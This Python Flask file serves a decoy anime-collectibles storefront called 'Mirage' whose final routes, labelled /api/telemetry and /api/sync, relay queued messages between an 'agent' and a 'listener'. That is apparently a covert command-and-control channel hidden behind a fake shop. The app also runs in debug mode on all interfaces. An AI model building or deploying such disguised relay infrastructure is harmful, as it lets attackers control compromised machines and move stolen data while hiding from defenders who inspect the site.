from flask import Flask, request, jsonify, render_template_string
from collections import deque
import logging 

app = Flask(__name__)

agent_to_listener = deque()
listener_to_agent = deque()
# ─────────────────────────────────────────────
# 1. THE STYLING (Defined first to avoid NameErrors)
# ─────────────────────────────────────────────
BASE_STYLE = """
@import url('https://fonts.googleapis.com/css2?family=Zen+Kaku+Gothic+New:wght@300;400;700;900&family=Noto+Serif+JP:wght@300;600&display=swap');

:root {
    --bg: #0a0a0f;
    --surface: #12121a;
    --border: #1e1e2e;
    --accent: #e040a0;
    --accent-glow: rgba(224, 64, 160, 0.3);
    --text: #e8e8f0;
    --muted: #8b8ba8;
}

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Zen Kaku Gothic New', sans-serif;
    line-height: 1.6;
    overflow-x: hidden;
    min-height: 100vh;
}

/* Background Effects */
.glass-bg {
    position: fixed;
    inset: 0;
    z-index: -1;
    background: radial-gradient(circle at 0% 0%, rgba(124, 58, 237, 0.05) 0%, transparent 50%),
                radial-gradient(circle at 100% 100%, rgba(224, 64, 160, 0.05) 0%, transparent 50%);
}

.container { max-width: 1200px; margin: 0 auto; padding: 0 2rem; }

/* Navigation */
nav {
    position: fixed; top: 0; width: 100%; z-index: 100;
    padding: 1.5rem 0;
    background: rgba(10, 10, 15, 0.8);
    backdrop-filter: blur(12px);
    border-bottom: 1px solid var(--border);
}
.nav-content { display: flex; justify-content: space-between; align-items: center; }
.logo { font-family: 'Noto Serif JP', serif; font-size: 1.5rem; color: var(--accent); text-decoration: none; font-weight: 600; }
.logo span { color: var(--text); font-weight: 300; }
.nav-links { display: flex; gap: 2rem; list-style: none; }
.nav-links a { color: var(--muted); text-decoration: none; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.1rem; transition: 0.3s; }
.nav-links a:hover { color: var(--accent); }

/* Buttons */
.btn {
    padding: 0.8rem 2rem;
    border-radius: 4px;
    font-size: 0.75rem;
    text-transform: uppercase;
    letter-spacing: 0.15rem;
    cursor: pointer;
    transition: 0.4s cubic-bezier(0.2, 1, 0.3, 1);
    text-decoration: none;
    display: inline-block;
}
.btn-primary { background: var(--accent); color: white; border: none; }
.btn-primary:hover { transform: translateY(-3px); box-shadow: 0 10px 20px var(--accent-glow); }
.btn-outline { border: 1px solid var(--border); color: var(--text); }
.btn-outline:hover { border-color: var(--accent); color: var(--accent); }

/* Cards */
.card-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 2rem; margin-top: 3rem; }
.card {
    background: var(--surface);
    border: 1px solid var(--border);
    padding: 2.5rem;
    transition: 0.4s;
}
.card:hover { border-color: var(--accent); transform: translateY(-5px); }
.card-tag { color: var(--accent); font-size: 0.6rem; text-transform: uppercase; letter-spacing: 0.2rem; margin-bottom: 1rem; }
.card h3 { font-family: 'Noto Serif JP', serif; margin-bottom: 1rem; font-size: 1.25rem; }
.card p { color: var(--muted); font-size: 0.9rem; }

/* Form Elements */
input, textarea {
    width: 100%;
    background: var(--surface);
    border: 1px solid var(--border);
    padding: 1rem;
    color: white;
    font-family: inherit;
    outline: none;
}
input:focus, textarea:focus { border-color: var(--accent); }

footer { padding: 4rem 0; border-top: 1px solid var(--border); margin-top: 8rem; text-align: center; color: var(--muted); font-size: 0.8rem; }

.hero { padding: 12rem 0 6rem; text-align: center; }
.hero h1 { font-family: 'Noto Serif JP', serif; font-size: 4rem; line-height: 1.1; margin-bottom: 1.5rem; }
.hero p { max-width: 600px; margin: 0 auto 2.5rem; color: var(--muted); }
"""

# ─────────────────────────────────────────────
# 2. THE BASE LAYOUT
# ─────────────────────────────────────────────
BASE_LAYOUT = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mirage — Rare Anime Imports</title>
    <style>{{ style }}</style>
</head>
<body>
    <div class="glass-bg"></div>
    <nav>
        <div class="container nav-content">
            <a href="/" class="logo">鏡 <span>Mirage</span></a>
            <ul class="nav-links">
                <li><a href="/">Home</a></li>
                <li><a href="/catalog">Catalog</a></li>
                <li><a href="/about">About</a></li>
                <li><a href="/contact">Contact</a></li>
            </ul>
        </div>
    </nav>

    <main class="container">
        {{ body_content | safe }}
    </main>

    <footer>
        <p>&copy; 2026 Mirage Imports. Shipped from Tokyo to the World.</p>
    </footer>
</body>
</html>
"""

# ─────────────────────────────────────────────
# 3. RENDER HELPER
# ─────────────────────────────────────────────
def render_mirage(content_html):
    return render_template_string(
        BASE_LAYOUT,
        style=BASE_STYLE,
        body_content=content_html
    )

# ─────────────────────────────────────────────
# 4. ROUTES
# ─────────────────────────────────────────────

@app.route("/")
def index():
    html = """
    <section class="hero">
        <div class="hero-eyebrow" style="color:var(--accent); letter-spacing: 0.4em; font-size: 0.7rem; margin-bottom: 1rem;">COLLECTION 2026</div>
        <h1>Curated Japanese Artifacts <br> <span style="font-weight:300; font-size: 0.5em; color: var(--muted);">日本からの限定品</span></h1>
        <p>Directly sourced limited editions from the heart of Akihabara. We don't do mass-market; we do masterpieces.</p>
        <div style="display: flex; gap: 1rem; justify-content: center;">
            <a href="/catalog" class="btn btn-primary">Enter Catalog</a>
            <a href="/about" class="btn btn-outline">Our Philosophy</a>
        </div>
    </section>

    <div class="card-grid">
        <div class="card">
            <div class="card-tag">New Drop</div>
            <h3>Neon Genesis Cels</h3>
            <p>Original production cels from the 1995 series. Verified and framed in museum-grade glass.</p>
        </div>
        <div class="card">
            <div class="card-tag">Vinyl</div>
            <h3>Cowboy Bebop OST</h3>
            <p>Seatbelts limited edition purple marble vinyl. Original pressing, factory sealed.</p>
        </div>
        <div class="card">
            <div class="card-tag">Archive</div>
            <h3>Vintage '98 Akira Tee</h3>
            <p>Screen-printed in Tokyo. Zero cracking, preserved in climate-controlled storage.</p>
        </div>
    </div>
    """
    return render_mirage(html)

@app.route("/catalog")
def catalog():
    html = """
    <section style="padding-top: 10rem;">
        <h2 style="font-family: 'Noto Serif JP', serif; font-size: 2.5rem; margin-bottom: 0.5rem;">Archive Catalog</h2>
        <p style="color: var(--muted); margin-bottom: 2rem;">Showing all available artifacts in our current inventory.</p>
        <div class="card-grid">
            <div class="card">
                <div class="card-tag">Figures</div>
                <h3>Rei Ayanami 1/6 Scale</h3>
                <p>Limited Gainax production. Only 3 units remaining.</p>
            </div>
            <div class="card">
                <div class="card-tag">Print</div>
                <h3>Shinkai Lithograph</h3>
                <p>Hand-signed by the director. Includes COA.</p>
            </div>
            <div class="card">
                <div class="card-tag">Music</div>
                <h3>Ghost in the Shell OST</h3>
                <p>Original 1995 Japanese Vinyl pressing.</p>
            </div>
        </div>
    </section>
    """
    return render_mirage(html)

@app.route("/about")
def about():
    html = """
    <section style="padding-top: 10rem; max-width: 800px;">
        <h2 style="font-family: 'Noto Serif JP', serif; font-size: 2.5rem;">Built by collectors, for collectors.</h2>
        <p style="margin-top: 2rem; color: var(--muted); font-size: 1.1rem; line-height: 1.8;">
            Mirage started in 2019 out of a single apartment in Shimokitazawa, Tokyo. 
            We spend our weekends at Mandarake, Hard Off, and Book Off to find things 
            you won't find anywhere else. No drop-shipping. No reproductions. Just the real thing.
        </p>
        <div style="margin-top: 4rem; display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;">
            <div style="border-left: 2px solid var(--accent); padding-left: 1.5rem;">
                <h4 style="font-size: 2rem;">4K+</h4>
                <p style="font-size: 0.7rem; text-transform: uppercase; color: var(--muted);">Items Sourced</p>
            </div>
            <div style="border-left: 2px solid var(--accent); padding-left: 1.5rem;">
                <h4 style="font-size: 2rem;">100%</h4>
                <p style="font-size: 0.7rem; text-transform: uppercase; color: var(--muted);">Authenticity Rate</p>
            </div>
        </div>
    </section>
    """
    return render_mirage(html)



@app.route("/contact")
def contact():
    html = """
    <section style="padding-top: 10rem; max-width: 500px; margin: 0 auto;">
        <h2 style="font-family: 'Noto Serif JP', serif; font-size: 2.5rem; margin-bottom: 2.5rem; text-align: center;">Get In Touch</h2>
        <div style="display: flex; flex-direction: column; gap: 1.5rem;">
            <div>
                <label style="font-size: 0.7rem; color: var(--muted); text-transform: uppercase; display: block; margin-bottom: 0.5rem;">Name</label>
                <input type="text" placeholder="Your name">
            </div>
            <div>
                <label style="font-size: 0.7rem; color: var(--muted); text-transform: uppercase; display: block; margin-bottom: 0.5rem;">Email</label>
                <input type="email" placeholder="your@email.com">
            </div>
            <div>
                <label style="font-size: 0.7rem; color: var(--muted); text-transform: uppercase; display: block; margin-bottom: 0.5rem;">Message</label>
                <textarea placeholder="What are you looking for?" rows="5"></textarea>
            </div>
            <button class="btn btn-primary" style="width: 100%;">Send Message</button>
        </div>
    </section>
    """
    return render_mirage(html)

@app.route("/api/telemetry", methods=['POST'])
def agent_upload():
    data = request.json.get("data")
    if data:
        agent_to_listener.append(data)
    return jsonify({"status":"ok"})

@app.route("/api/telemetry", methods=['GET'])
def agent_download():
    if listener_to_agent:
        return jsonify({"status":"ok","data":listener_to_agent.popleft()})
    return jsonify({"status":"ok","data":None})

@app.route("/api/sync", methods=['POST'])
def listener_upload():
    data = request.json.get("data")
    if data:
        listener_to_agent.append(data)
    return jsonify({"status":"ok","data":None})

@app.route("/api/sync", methods=["GET"])
def listener_download():
    if agent_to_listener:
        return jsonify({"status":"ok","data":agent_to_listener.popleft()})
    return jsonify({"status":"ok","data":None})

# ─────────────────────────────────────────────
# 5. EXECUTION
# ─────────────────────────────────────────────
if __name__ == "__main__":
    print("[mirage] Aesthetic interface live on http://localhost:4696")
    app.run(host="0.0.0.0", port=4696, debug=True)

    